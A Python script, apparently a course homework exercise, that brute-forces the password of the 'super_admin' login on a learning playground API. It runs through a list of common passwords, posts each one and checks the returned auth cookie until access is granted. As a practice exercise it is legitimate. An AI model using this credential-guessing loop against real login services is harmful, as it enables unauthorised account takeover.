import requests

# Defining urls for usage in the script
auth_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
# Defining the known login
login = "super_admin"
# Response if authorization succeeded
success_auth_response = "You are authorized"
# Response if authorization not succeeded
failed_auth_response = "You are NOT authorized"
# Top 25 most common passwords by year according to SplashData
# taken from https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
# Duplicates removed
passwords_to_check = ["!@#$%^&amp;*", "000000", "111111", "121212", "123123", "1234", "12345", "123456", "1234567",
                      "12345678", "123456789", "1234567890", "123qwe", "1q2w3e4r", "1qaz2wsx", "555555", "654321",
                      "666666", "696969", "7777777", "888888", "aa123456", "abc123", "access", "admin", "ashley",
                      "azerty", "bailey", "baseball", "batman", "charlie", "donald", "dragon", "flower", "football",
                      "freedom", "hello", "hottie", "iloveyou", "jesus", "letmein", "login", "lovely", "loveme",
                      "master", "michael", "monkey", "mustang", "ninja", "passw0rd", "password1", "princess", "qazwsx",
                      "qwerty", "qwerty123", "qwertyuiop", "shadow", "solo", "starwars", "sunshine", "sunshine",
                      "superman", "trustno1", "welcome", "whatever", "zaq1zaq1"]
# Checking cookie for each password
for password in passwords_to_check:
    payload = {"login": login, "password": password}
    get_cookie = requests.post(url=auth_url, data=payload)
    cookie_value = get_cookie.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
        check_cookie = requests.post(url=check_auth_url, cookies=cookies)
        # If authorization failed we continue with next password
        if check_cookie.text == failed_auth_response:
            continue
        # If authorization succeeded we stop further validation
        elif check_cookie.text == success_auth_response:
            print(f"{check_cookie.text}! The correct password is {password}")
            break
    else:
        print("cookie is not generated")
